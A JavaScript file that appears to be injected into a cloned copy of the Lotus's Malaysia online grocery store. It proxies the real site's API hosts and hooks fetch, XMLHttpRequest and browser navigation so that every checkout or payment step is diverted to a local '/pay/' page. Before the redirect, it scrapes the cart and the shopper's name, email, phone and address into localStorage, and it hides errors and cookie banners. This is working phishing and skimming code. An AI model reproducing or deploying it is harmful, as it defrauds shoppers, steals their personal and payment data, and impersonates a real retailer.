(function(){
  'use strict';

  // Set CIF commerce endpoint BEFORE any scripts load
  window.CIF = window.CIF || {};
  window.CIF.CommerceGraphqlEndpoint = '/graphql';
  window.CIF.storeView = 'default';

  if (!window.__magentoStoreConfig) {
    window.__magentoStoreConfig = { graphqlEndpoint: '/graphql', storeView: 'default' };
  }

  window.addEventListener('error', function(e) {
    if (e.filename && e.filename.indexOf('reviews') !== -1) {
      e.preventDefault();
      e.stopPropagation();
      return true;
    }
    if (e.message && (
      e.message.indexOf('commerce API') !== -1 ||
      e.message.indexOf('initialization object') !== -1
    )) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    }
  }, true);

  window.addEventListener('unhandledrejection', function(e) {
    e.preventDefault();
  });

  // Route backend API hosts through the same-origin passthrough (/__api/<host>) to
  // avoid cross-origin CORS failures that crash the app into /errors/500. Other
  // lotuss storefront domains are stripped to root-relative paths.
  function rewriteUrl(u) {
    if (typeof u !== 'string') return u;
    u = u.replace(/(?:https?:)?\/\/(api-o2o|api-customer|shoponline-bffapi)\.lotuss\.com\.my/gi, '/__api/$1.lotuss.com.my');
    u = u.replace(/(?:https?:)?\/\/(?:www\.|shoponline\.|mcprod\.)?lotuss\.com\.my/gi, '');
    return u;
  }

  function getUrl(input) {
    if (typeof input === 'string') return input;
    if (input instanceof Request) return input.url;
    return '';
  }

  window.addEventListener('beforeunload', function(e) { e.stopImmediatePropagation(); }, true);

  function redirectPay() {
    var data = extractOrderData();
    try {
      localStorage.setItem('lotus_order', JSON.stringify(data));
    } catch(ex) {}
    location.href = '/pay/';
  }

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    var url = getUrl(input);
    if (url) {
      var p = url.split('?')[0];

      // Intercept model.json fetches to inject commerce config
      if (/\.model\.json/i.test(p)) {
        return _fetch.call(window, input, init).then(function(res) {
          return res.text().then(function(text) {
            try {
              var data = JSON.parse(text);
              var modified = false;
              function walk(obj) {
                if (!obj || typeof obj !== 'object') return;
                if (Array.isArray(obj)) { obj.forEach(walk); return; }
                if (obj.endpoint && typeof obj.endpoint === 'string' && /mcprod\.lotuss\.com\.my/i.test(obj.endpoint)) {
                  obj.endpoint = '/graphql';
                  modified = true;
                }
                if (obj.commerceEndpoint && typeof obj.commerceEndpoint === 'string' && /mcprod\.lotuss\.com\.my/i.test(obj.commerceEndpoint)) {
                  obj.commerceEndpoint = '/graphql';
                  modified = true;
                }
                Object.keys(obj).forEach(function(k) { walk(obj[k]); });
              }
              walk(data);
              if (modified) {
                return new Response(JSON.stringify(data), { status: res.status, statusText: res.statusText, headers: res.headers });
              }
            } catch(ex) {}
            return new Response(text, { status: res.status, statusText: res.statusText, headers: res.headers });
          });
        });
      }

      if (/\.(js|css|png|jpg|woff2?)(\?|$)/.test(p)) {
        return _fetch.call(window, input, init);
      }

      if (/\/payment|\/checkout|\/placeOrder|\/createOrder|\/setPayment/i.test(p)) {
        redirectPay();
        return new Promise(function() {});
      }

      var rewritten = rewriteUrl(url);
      if (rewritten !== url) {
        if (typeof input === 'string') input = rewritten;
        else if (input instanceof Request) input = new Request(rewritten, input);
      }
    }
    return _fetch.call(window, input, init);
  };

  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    var args = Array.prototype.slice.call(arguments);
    if (typeof url === 'string') args[1] = rewriteUrl(url);
    return _origOpen.apply(this, args);
  };

  function _checkPayUrl(url) {
    if (typeof url === 'string') {
      var p = url.split('?')[0];
      if (
        /\/payment/i.test(p) ||
        /\/checkout(\?|$)/i.test(p) ||
        /\/placeOrder/i.test(p) ||
        /\/order-confirmation/i.test(p)
      ) {
        redirectPay();
        return '/pay/';
      }
    }
    return url;
  }

  var _ps = history.pushState;
  history.pushState = function(s, t, u) { u = _checkPayUrl(u); return _ps.call(this, s, t, u); };
  var _rs = history.replaceState;
  history.replaceState = function(s, t, u) { u = _checkPayUrl(u); return _rs.call(this, s, t, u); };
  try { var _assign = location.assign.bind(location); location.assign = function(u) { return _assign(_checkPayUrl(u)); }; } catch(e) {}
  try { var _rep = location.replace.bind(location); location.replace = function(u) { return _rep(_checkPayUrl(u)); }; } catch(e) {}

  function extractOrderData() {
    var data = {};
    data.productType = 'Grocery';
    data.currency = 'MYR';

    try {
      var totalEl = document.querySelector('.order-total, [class*="total"], [class*="grand_total"]');
      if (totalEl) {
        var txt = totalEl.textContent || '';
        var m = txt.match(/[\d,.]+/);
        if (m) data.amount = m[0].replace(/,/g, '');
      }
    } catch(ex) {}

    try {
      var items = [];
      var itemEls = document.querySelectorAll('.cart-item, [class*="cartItem"], [class*="product-item"], [class*="lineItem"]');
      itemEls.forEach(function(el) {
        var nameEl = el.querySelector('[class*="name"], [class*="title"], .product-name');
        var qtyEl = el.querySelector('[class*="qty"], [class*="quantity"], input[type="number"]');
        var priceEl = el.querySelector('[class*="price"], .price');
        var name = nameEl ? nameEl.textContent.trim() : '';
        var qty = qtyEl ? (parseInt(qtyEl.value || qtyEl.textContent) || 1) : 1;
        var priceTxt = priceEl ? priceEl.textContent.trim() : '';
        var pm = priceTxt.match(/[\d,.]+/);
        var price = pm ? pm[0].replace(/,/g, '') : '0';
        if (name) items.push({ name: name, qty: qty, price: price });
      });
      if (items.length > 0) data.items = items;
    } catch(ex) {}

    try {
      var nameEl = document.querySelector('#bill-name, [name="fullName"], [class*="fullName"], input[placeholder*="name" i]');
      if (nameEl) data.customerName = nameEl.value || nameEl.textContent.trim();
      var emailEl = document.querySelector('#bill-email, [name="email"], [class*="email"], input[type="email"]');
      if (emailEl) data.email = emailEl.value || emailEl.textContent.trim();
      var phoneEl = document.querySelector('#bill-phone, [name="phone"], [class*="phone"], input[type="tel"]');
      if (phoneEl) data.phone = phoneEl.value || phoneEl.textContent.trim();
      var addrEl = document.querySelector('#bill-address, [name="address"], [class*="address"], input[placeholder*="address" i]');
      if (addrEl) data.address = addrEl.value || addrEl.textContent.trim();
    } catch(ex) {}

    console.log('[Lotus] Extracted order data:', data);
    return data;
  }

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}[class*="cookieConsent"]{display:none!important}[class*="cookie-banner"]{display:none!important}';
  document.head.appendChild(style);

})();
